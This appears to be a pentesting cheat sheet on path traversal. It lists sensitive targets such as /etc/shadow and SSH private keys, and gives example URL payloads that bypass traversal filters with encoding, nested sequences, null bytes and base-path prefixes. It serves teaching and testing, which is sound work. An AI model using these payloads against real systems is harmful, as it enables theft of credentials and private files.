# Path traversal

## Summary
* [Check Apache files](#apache-files-worth-to-check)
* [Path traversal with sequences](#path-traversal-with-traversal-sequences)
* [Common filters on path traversal](#common-obstacles-to-exploiting-file-path-traversal-vulnerabilities)
    * [Absolute path filter](#file-path-traversal-traversal-sequences-blocked-with-absolute-path-bypass)
    * [Sequences stripped non-recursively](#file-path-traversal-traversal-sequences-stripped-non-recursively)
    * [Sequences stripped with superfluous url decoding](#file-path-traversal-traversal-sequences-stripped-with-superfluous-url-decode)
    * [Validation on start of path](#file-path-traversal-validation-of-start-of-path)
    * [Validation of file extension](#file-path-traversal-validation-of-file-extension-with-null-byte-bypass)
    * [Whitelist and blacklist](#file-path-traversal-bypassing-whitelisted-and-blacklisted)

## Apache files worth to check
```
/etc/passwd
/etc/ssh/sshd_config
/etc/ssh/ssh_config
/var/log/apache2/access.log -> log poisoning
/etc/apache2/sites-enabled/000-default.conf
/home/user/.ssh/id_rsa
/etc/shadow
/cgi-bin/phpinfo.php
/proc/1/cmdline -> to see if you are inside a docker container
/proc/mounts -> see mounted services
```

## Path traversal with traversal sequences
Suppose an application displays images of items for sale
``` 
> http://example.com?img=img1.jpg
> the img1.jpg is located in /var/www/images
```
Using traversal sequences, an attacker can navigate to the file root system to read an arbitrary file
```
> http://example.com?img=../../../etc/passwd
> the three consecutive ../ sequences step up from /var/www/images to the file root system
```

## Common obstacles to exploiting file path traversal vulnerabilities
### File path traversal, traversal sequences blocked with absolute path bypass
```
> without using any traversal sequences, an attacker would just have to submit the file path they want to read
    # http://example.com?img=/etc/passwd
    # this works because the application is blocking traversal sequences with absolute path meaning the file path will always be in the root file system
```
### File path traversal, traversal sequences stripped non-recursively
```
> using nested traversal sequences migh help an attacker to bypass the stripping sequence
    # ....// or ....\/ which will revert to simple traversal sequences when the inner sequence is stripped
```
### File path traversal, traversal sequences stripped with superfluous URL-decode
```
> in some context, directory traversal sequences will be stripped off even before the web server pass the input to the application
> an attacker can bypass this kind of sanitization by URL encoding
    # ../ resulting in %2e%2e%2f or %252e%252e%252f or ..%c0%af or ..%ef%bc%8f
    # using the encoded traversal sequences might help an attacker to bypass the sanitization
```
### File path traversal, validation of start of path
```
> in some context, an application will need the expected base folder such as /var/www/images before the filename
> to exploit this, an attacker could simply include a traversal sequences after the base folder
    # http://example.com?img=/var/www/images/../../../etc/passwd
```
### File path traversal, validation of file extension with null byte bypass
```
> in some context, an application requires the the filename must end with an expected extension such as .png
> an attacker can bypass this validation by including null byte after the filename
    # http://example.com?img=/etc/passwd%00.png
    # the %00 will terminate the file path before the required extension
```
### File path traversal, bypassing whitelisted and blacklisted
```
> in some context, an application will need the expected base folder such as /var/www/html before the filename and an application might black-listed some characters such as ../../
> an attacker can bypass this validation by replacing the traversal sequence ../../ to .././..
    # http://example.com?query=/var/www/html/.././.././.././../etc/passwd
``` 
